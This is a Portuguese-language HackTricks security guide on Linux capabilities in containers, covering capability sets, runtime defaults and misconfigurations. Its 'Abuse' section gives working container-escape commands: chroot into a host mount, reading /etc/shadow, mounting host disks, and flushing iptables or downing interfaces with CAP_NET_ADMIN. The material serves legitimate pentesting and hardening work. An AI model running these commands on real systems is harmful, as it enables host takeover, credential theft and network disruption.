# Capacidades do Linux em Containers

{{#include ../../../../banners/hacktricks-training.md}}

## Visão geral

As capacidades do Linux são uma das partes mais importantes da segurança de containers porque respondem a uma pergunta sutil, porém fundamental: **o que "root" realmente significa dentro de um container?** Em um sistema Linux normal, UID 0 historicamente implicava um conjunto de privilégios muito amplo. Em kernels modernos, esse privilégio é decomposto em unidades menores chamadas capabilities. Um processo pode executar como root e ainda assim não possuir muitas operações poderosas se as capabilities relevantes tiverem sido removidas.

Containers dependem fortemente dessa distinção. Muitas cargas de trabalho ainda são iniciadas como UID 0 dentro do container por motivos de compatibilidade ou simplicidade. Sem o dropping de capabilities, isso seria extremamente perigoso. Com o dropping de capabilities, um processo root dentro do container ainda pode executar muitas tarefas comuns no container enquanto é impedido de realizar operações de kernel mais sensíveis. É por isso que um shell de container que mostra `uid=0(root)` não significa automaticamente "host root" ou mesmo "privilégio amplo de kernel". Os conjuntos de capabilities decidem quanto vale essa identidade root na prática.

Para a referência completa de Linux capabilities e muitos exemplos de abuso, veja:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Operation

Capabilities são rastreadas em vários conjuntos, incluindo permitted, effective, inheritable, ambient, and bounding sets. Para muitas avaliações de containers, a semântica exata do kernel de cada conjunto é menos imediatamente importante do que a questão prática final: **quais operações privilegiadas este processo consegue executar agora, e quais ganhos futuros de privilégio ainda são possíveis?**

A razão pela qual isso importa é que muitas técnicas de breakout são, na verdade, problemas de capabilities disfarçados de problemas de container. Uma carga de trabalho com `CAP_SYS_ADMIN` pode acessar uma enorme quantidade de funcionalidade do kernel que um processo root de container normal não deveria tocar. Uma carga de trabalho com `CAP_NET_ADMIN` torna-se muito mais perigosa se também compartilhar o namespace de rede do host. Uma carga de trabalho com `CAP_SYS_PTRACE` torna-se muito mais interessante se puder ver processos do host através do compartilhamento de PID do host. Em Docker ou Podman isso pode aparecer como `--pid=host`; em Kubernetes normalmente aparece como `hostPID: true`.

Em outras palavras, o conjunto de capabilities não pode ser avaliado isoladamente. Ele deve ser lido em conjunto com namespaces, seccomp, e MAC policy.

## Lab

Uma forma bastante direta de inspecionar as capacidades dentro de um container é:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Você também pode comparar um container mais restritivo com outro que tenha todas as capabilities adicionadas:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Para ver o efeito de uma adição limitada, tente remover tudo e adicionar de volta apenas uma capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Esses pequenos experimentos ajudam a mostrar que um runtime não está simplesmente alternando um booleano chamado "privileged". Ele está moldando a superfície real de privilégios disponível para o processo.

## High-Risk Capabilities

Embora muitas capabilities possam importar dependendo do alvo, algumas são repetidamente relevantes na análise de container escape.

**`CAP_SYS_ADMIN`** é aquela que os defensores devem tratar com mais suspeita. Frequentemente é descrita como "the new root" porque desbloqueia uma enorme quantidade de funcionalidades, incluindo operações relacionadas a mount, comportamento sensível a namespace e muitos caminhos do kernel que nunca deveriam ser expostos casualmente a containers. Se um container tiver `CAP_SYS_ADMIN`, seccomp fraco e nenhuma contenção MAC forte, muitos caminhos clássicos de breakout tornam-se muito mais realistas.

**`CAP_SYS_PTRACE`** importa quando existe visibilidade de processos, especialmente se o PID namespace é compartilhado com o host ou com workloads vizinhos interessantes. Pode transformar visibilidade em manipulação.

**`CAP_NET_ADMIN`** e **`CAP_NET_RAW`** importam em ambientes focados em rede. Em uma bridge network isolada eles já podem ser arriscados; em um host network namespace compartilhado são muito piores porque o workload pode reconfigurar a rede do host, sniffar, spoofar ou interferir em fluxos de tráfego locais.

**`CAP_SYS_MODULE`** é geralmente catastrófica em um ambiente com root porque carregar módulos do kernel é efetivamente controle do kernel do host. Quase nunca deveria aparecer em um workload de container de uso geral.

## Runtime Usage

Docker, Podman, containerd-based stacks, and CRI-O todos usam controles de capabilities, mas os defaults e as interfaces de gerenciamento diferem. Docker os expõe de forma muito direta através de flags como `--cap-drop` e `--cap-add`. Podman expõe controles similares e frequentemente se beneficia da execução rootless como uma camada adicional de segurança. Kubernetes expõe adições e remoções de capabilities através do Pod ou do container `securityContext`. Ambientes de system-container como LXC/Incus também dependem do controle de capabilities, mas a integração mais ampla com o host desses sistemas frequentemente leva operadores a relaxar os defaults com mais agressividade do que fariam em um ambiente de app-container.

O mesmo princípio vale para todos eles: uma capability que é tecnicamente possível conceder não é necessariamente uma que deva ser concedida. Muitos incidentes no mundo real começam quando um operador adiciona uma capability simplesmente porque um workload falhou sob uma configuração mais restrita e a equipe precisou de um conserto rápido.

## Misconfigurations

O erro mais óbvio é **`--cap-add=ALL`** em CLIs estilo Docker/Podman, mas não é o único. Na prática, um problema mais comum é conceder uma ou duas capabilities extremamente poderosas, especialmente `CAP_SYS_ADMIN`, para "fazer a aplicação funcionar" sem também entender as implicações de namespace, seccomp e mount. Outro modo comum de falha é combinar capabilities extras com compartilhamento de namespace do host. No Docker ou Podman isso pode aparecer como `--pid=host`, `--network=host` ou `--userns=host`; no Kubernetes a exposição equivalente geralmente aparece através de configurações de workload como `hostPID: true` ou `hostNetwork: true`. Cada uma dessas combinações altera o que a capability pode realmente afetar.

Também é comum ver administradores acreditarem que, porque um workload não é totalmente `--privileged`, ele ainda está significativamente contido. Às vezes isso é verdade, mas outras vezes a postura efetiva já está perto o suficiente de privileged para que a distinção deixe de importar operacionalmente.

## Abuse

O primeiro passo prático é enumerar o conjunto efetivo de capabilities e imediatamente testar as ações específicas de cada capability que seriam relevantes para escape ou acesso a informações do host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Se `CAP_SYS_ADMIN` estiver presente, teste primeiro mount-based abuse e host filesystem access, porque este é um dos facilitadores de breakout mais comuns:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Se `CAP_SYS_PTRACE` estiver presente e o container conseguir ver processos interessantes, verifique se a capability pode ser transformada em inspeção de processos:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Se `CAP_NET_ADMIN` ou `CAP_NET_RAW` estiver presente, teste se a carga de trabalho pode manipular a pilha de rede visível ou pelo menos coletar inteligência de rede útil:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Quando um teste de capability tem sucesso, combine-o com a situação do namespace. Uma capability que parece apenas arriscada em um namespace isolado pode tornar-se imediatamente uma primitive de escape ou de host-recon quando o container também compartilha host PID, host network ou host mounts.

### Exemplo completo: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Se o container possui `CAP_SYS_ADMIN` e um bind mount gravável do host filesystem, como `/host`, o caminho de escape costuma ser direto:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Se `chroot` tiver sucesso, os comandos agora são executados no contexto do sistema de arquivos raiz do host:
```bash
id
hostname
cat /etc/shadow | head
```
Se `chroot` não estiver disponível, o mesmo resultado pode frequentemente ser alcançado chamando o binário através da árvore montada:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Exemplo completo: `CAP_SYS_ADMIN` + Acesso ao dispositivo

Se um dispositivo de bloco do host for exposto, `CAP_SYS_ADMIN` pode transformá-lo em acesso direto ao sistema de arquivos do host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Full Example: `CAP_NET_ADMIN` + Host Networking

Esta combinação nem sempre produz root do host diretamente, mas pode reconfigurar completamente a pilha de rede do host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Isso pode permitir denial of service, interceptação de tráfego ou acesso a serviços que antes estavam filtrados.

## Verificações

O objetivo das capability checks não é apenas exibir valores brutos, mas entender se o processo tem privilégios suficientes para tornar sua situação atual de namespace e mount perigosa.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
O que é interessante aqui:

- `capsh --print` é a maneira mais fácil de detectar capacidades de alto risco como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` ou `cap_sys_module`.
- A linha `CapEff` em `/proc/self/status` indica o que está efetivamente ativo agora, não apenas o que pode estar disponível em outros conjuntos.
- Um dump de capacidades torna-se muito mais importante se o container também compartilha namespaces de PID, de rede ou de usuário do host, ou possui mounts do host graváveis.

Depois de coletar a informação bruta sobre capabilities, o próximo passo é a interpretação. Pergunte se o processo é root, se user namespaces estão ativos, se namespaces do host são compartilhados, se seccomp está em modo enforcing, e se AppArmor ou SELinux ainda restringem o processo. Um conjunto de capabilities por si só é apenas parte da história, mas frequentemente é a parte que explica por que uma quebra de container funciona e outra falha com o mesmo ponto de partida aparente.

## Padrões de runtime

| Runtime / platform | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Conjunto reduzido de capabilities por padrão | Docker mantém uma lista de permissões padrão de capabilities e remove o resto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto reduzido de capabilities por padrão | Containers do Podman são não privilegiados por padrão e usam um modelo reduzido de capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Herda os padrões do runtime, salvo alterações | Se nenhum `securityContext.capabilities` for especificado, o container recebe o conjunto de capabilities padrão do runtime | `securityContext.capabilities.add`, falhar em `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Normalmente padrão do runtime | O conjunto efetivo depende do runtime mais a especificação do Pod | mesmo que a linha do Kubernetes; configuração direta OCI/CRI também pode adicionar capabilities explicitamente |

Para Kubernetes, o ponto importante é que a API não define um conjunto de capabilities padrão universal. Se o Pod não adicionar nem remover capabilities, a workload herda o padrão do runtime daquele nó.
{{#include ../../../../banners/hacktricks-training.md}}
